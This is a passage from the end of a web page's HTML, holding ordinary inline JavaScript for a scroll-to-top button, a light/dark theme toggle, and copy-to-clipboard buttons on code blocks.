        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
